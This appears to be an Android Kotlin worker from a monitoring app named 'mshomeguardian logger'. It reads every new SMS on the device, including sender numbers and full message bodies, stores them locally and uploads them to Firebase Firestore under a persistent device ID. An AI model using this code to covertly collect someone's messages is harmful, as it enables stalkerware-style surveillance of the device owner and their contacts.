package com.mshomeguardian.logger.workers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.provider.Telephony
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.mshomeguardian.logger.data.AppDatabase
import com.mshomeguardian.logger.data.MessageEntity
import com.mshomeguardian.logger.utils.DeviceIdentifier
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.util.*

class MessageWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val db = AppDatabase.getInstance(context.applicationContext)
    private val deviceId = DeviceIdentifier.getPersistentDeviceId(context.applicationContext)

    private val firestore: FirebaseFirestore? = try {
        FirebaseFirestore.getInstance()
    } catch (e: Exception) {
        Log.e(TAG, "Failed to initialize Firestore", e)
        null
    }

    companion object {
        private const val TAG = "MessageWorker"
        private const val SYNC_LIMIT = 50 // Reduced to avoid excessive processing
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        return@withContext try {
            // Check permissions
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Missing READ_SMS permission")
                return@withContext Result.failure()
            }

            // Get last sync time from shared preferences
            val prefs = applicationContext.getSharedPreferences("message_sync", Context.MODE_PRIVATE)
            val lastSyncTime = prefs.getLong("last_sync_time", 0)
            val currentTime = System.currentTimeMillis()

            // Sync SMS messages
            val syncCount = syncMessages(lastSyncTime, currentTime)

            // If db operations succeeded, upload new records to Firestore
            val uploadCount = uploadNewRecords()

            // Update last sync time if successful
            prefs.edit().putLong("last_sync_time", currentTime).apply()

            Log.d(TAG, "Message sync completed. Synced $syncCount records. Uploaded $uploadCount records.")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Error syncing messages", e)
            Result.retry()
        }
    }

    private suspend fun syncMessages(lastSyncTime: Long, currentTime: Long): Int {
        val messages = mutableListOf<MessageEntity>()
        var cursor: Cursor? = null

        try {
            // Query SMS messages since last sync
            val uri = Telephony.Sms.CONTENT_URI
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.DATE,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ,
                Telephony.Sms.SEEN,
                Telephony.Sms.STATUS,
                Telephony.Sms.SUBJECT,
                Telephony.Sms.THREAD_ID,
                Telephony.Sms.PERSON,
                Telephony.Sms.PROTOCOL,
                Telephony.Sms.REPLY_PATH_PRESENT,
                Telephony.Sms.SERVICE_CENTER
            )

            // Selection for messages after the last sync time
            val selection = "${Telephony.Sms.DATE} > ?"
            val selectionArgs = arrayOf(lastSyncTime.toString())
            val sortOrder = "${Telephony.Sms.DATE} DESC"

            try {
                cursor = applicationContext.contentResolver.query(
                    uri, projection, selection, selectionArgs, sortOrder
                )
            } catch (e: Exception) {
                Log.e(TAG, "Error querying SMS with selection, trying without selection", e)
                cursor = applicationContext.contentResolver.query(
                    uri, projection, null, null, sortOrder
                )
            }

            var count = 0
            cursor?.let {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                val seenIndex = it.getColumnIndex(Telephony.Sms.SEEN)
                val statusIndex = it.getColumnIndex(Telephony.Sms.STATUS)
                val subjectIndex = it.getColumnIndex(Telephony.Sms.SUBJECT)
                val threadIdIndex = it.getColumnIndex(Telephony.Sms.THREAD_ID)
                val personIndex = it.getColumnIndex(Telephony.Sms.PERSON)
                val protocolIndex = it.getColumnIndex(Telephony.Sms.PROTOCOL)
                val replyPathPresentIndex = it.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT)
                val serviceCenterIndex = it.getColumnIndex(Telephony.Sms.SERVICE_CENTER)

                while (it.moveToNext() && count < SYNC_LIMIT) {
                    val messageId = if (idIndex >= 0) it.getString(idIndex) else UUID.randomUUID().toString()
                    val address = if (addressIndex >= 0 && !it.isNull(addressIndex)) it.getString(addressIndex) ?: "" else ""
                    val date = if (dateIndex >= 0) it.getLong(dateIndex) else currentTime
                    val body = if (bodyIndex >= 0 && !it.isNull(bodyIndex)) it.getString(bodyIndex) else null
                    val type = if (typeIndex >= 0) it.getInt(typeIndex) else Telephony.Sms.MESSAGE_TYPE_INBOX
                    val read = if (readIndex >= 0) it.getInt(readIndex) == 1 else false
                    val seen = if (seenIndex >= 0) it.getInt(seenIndex) == 1 else false
                    val status = if (statusIndex >= 0 && !it.isNull(statusIndex)) it.getInt(statusIndex) else null
                    val subject = if (subjectIndex >= 0 && !it.isNull(subjectIndex)) it.getString(subjectIndex) else null
                    val threadId = if (threadIdIndex >= 0) it.getLong(threadIdIndex) else null
                    val person = if (personIndex >= 0 && !it.isNull(personIndex)) it.getString(personIndex) else null
                    val protocol = if (protocolIndex >= 0 && !it.isNull(protocolIndex)) it.getInt(protocolIndex) else null
                    val replyPathPresent = if (replyPathPresentIndex >= 0) it.getInt(replyPathPresentIndex) == 1 else null
                    val serviceCenter = if (serviceCenterIndex >= 0 && !it.isNull(serviceCenterIndex)) it.getString(serviceCenterIndex) else null

                    // Look up contact name if available
                    val contactName = getContactNameFromNumber(address)

                    // Create message entity
                    val messageEntity = MessageEntity(
                        messageId = messageId,
                        syncTimestamp = currentTime,
                        phoneNumber = address,
                        timestamp = date,
                        body = body,
                        type = type,
                        subject = subject,
                        messageType = "SMS",
                        contactName = contactName,
                        isRead = read,
                        seen = seen,
                        deliveryStatus = status,
                        errorCode = null,
                        deletedLocally = false,
                        uploadedToCloud = false,
                        thread_id = threadId,
                        person = person,
                        protocol = protocol,
                        replyPathPresent = replyPathPresent,
                        serviceCenter = serviceCenter,
                        status = status,
                        deviceId = deviceId
                    )

                    // For SMS messages, add directly to list without checking DB
                    messages.add(messageEntity)
                    count++
                }
            }

// Insert all new messages in bulk
// Insert all new messages in bulk
            if (messages.isNotEmpty()) {
                try {
                    db.messageDao().insertMessages(messages)
                    Log.d(TAG, "Inserted ${messages.size} new messages")
                } catch (e: Exception) {
                    // If Room database is having issues, we'll upload directly to Firestore
                    Log.e(TAG, "Error inserting to database, will upload directly to Firestore", e)
                    for (message in messages) {
                        uploadMessageDirectly(message)
                    }
                }
            }

            return messages.size
        } catch (e: Exception) {
            Log.e(TAG, "Error querying messages", e)
            throw e
        } finally {
            cursor?.close()
        }
    }

    private fun getContactNameFromNumber(phoneNumber: String): String? {
        if (phoneNumber.isBlank()) return null

        try {
            // A simpler approach that doesn't query contacts database again
            // Just return the phone number for now - we already have contacts
            // from the ContactsWorker
            return null
        } catch (e: Exception) {
            Log.e(TAG, "Error looking up contact name", e)
            return null
        }
    }

    private suspend fun uploadMessageDirectly(message: MessageEntity) {
        val firestoreInstance = firestore ?: return

        try {
            // Convert to a Map for Firestore
            val messageMap = HashMap<String, Any?>()
            messageMap["messageId"] = message.messageId
            messageMap["syncTimestamp"] = message.syncTimestamp
            messageMap["phoneNumber"] = message.phoneNumber
            messageMap["timestamp"] = message.timestamp
            messageMap["body"] = message.body ?: ""
            messageMap["type"] = message.type
            messageMap["subject"] = message.subject ?: ""
            messageMap["messageType"] = message.messageType
            messageMap["contactName"] = message.contactName ?: ""
            messageMap["isRead"] = message.isRead
            messageMap["seen"] = message.seen
            messageMap["deliveryStatus"] = message.deliveryStatus
            messageMap["errorCode"] = message.errorCode
            messageMap["deletedLocally"] = message.deletedLocally
            messageMap["thread_id"] = message.thread_id
            messageMap["person"] = message.person ?: ""
            messageMap["protocol"] = message.protocol
            messageMap["replyPathPresent"] = message.replyPathPresent
            messageMap["serviceCenter"] = message.serviceCenter ?: ""
            messageMap["status"] = message.status
            messageMap["deviceId"] = message.deviceId

            // Upload to Firestore
            firestoreInstance.collection("devices")
                .document(message.deviceId)
                .collection("messages")
                .document(message.messageId)
                .set(messageMap, SetOptions.merge())
                .await()

            Log.d(TAG, "Message ${message.messageId} uploaded directly to Firestore")
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading message directly ${message.messageId}: ${e.message}")
        }
    }

    private suspend fun uploadNewRecords(): Int {
        val firestoreInstance = firestore ?: return 0
        var uploadCount = 0

        try {
            // Get messages that haven't been uploaded
            val notUploadedMessages = try {
                db.messageDao().getNotUploadedMessages()
            } catch (e: Exception) {
                Log.e(TAG, "Error getting not uploaded messages", e)
                emptyList()
            }
            Log.d(TAG, "Found ${notUploadedMessages.size} messages to upload")

            for (message in notUploadedMessages) {
                try {
                    // Convert to a Map for Firestore
                    val messageMap = HashMap<String, Any?>()
                    messageMap["messageId"] = message.messageId
                    messageMap["syncTimestamp"] = message.syncTimestamp
                    messageMap["phoneNumber"] = message.phoneNumber
                    messageMap["timestamp"] = message.timestamp
                    messageMap["body"] = message.body ?: ""
                    messageMap["type"] = message.type
                    messageMap["subject"] = message.subject ?: ""
                    messageMap["messageType"] = message.messageType
                    messageMap["contactName"] = message.contactName ?: ""
                    messageMap["isRead"] = message.isRead
                    messageMap["seen"] = message.seen
                    messageMap["deliveryStatus"] = message.deliveryStatus
                    messageMap["errorCode"] = message.errorCode
                    messageMap["deletedLocally"] = message.deletedLocally
                    messageMap["thread_id"] = message.thread_id
                    messageMap["person"] = message.person ?: ""
                    messageMap["protocol"] = message.protocol
                    messageMap["replyPathPresent"] = message.replyPathPresent
                    messageMap["serviceCenter"] = message.serviceCenter ?: ""
                    messageMap["status"] = message.status
                    messageMap["deviceId"] = message.deviceId

                    // Upload to Firestore
                    firestoreInstance.collection("devices")
                        .document(message.deviceId)
                        .collection("messages")
                        .document(message.messageId)
                        .set(messageMap, SetOptions.merge())
                        .await()

                    try {
                        // Mark as uploaded
                        val uploadTime = System.currentTimeMillis()
                        db.messageDao().markMessageAsUploaded(message.id, uploadTime)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error marking message as uploaded: ${e.message}")
                    }

                    uploadCount++
                    Log.d(TAG, "Message ${message.messageId} uploaded successfully")

                } catch (e: Exception) {
                    Log.e(TAG, "Error uploading message ${message.messageId}: ${e.message}")
                    // Continue with next record
                }
            }

            return uploadCount
        } catch (e: Exception) {
            Log.e(TAG, "Error in uploadNewRecords", e)
            return 0
        }
    }
}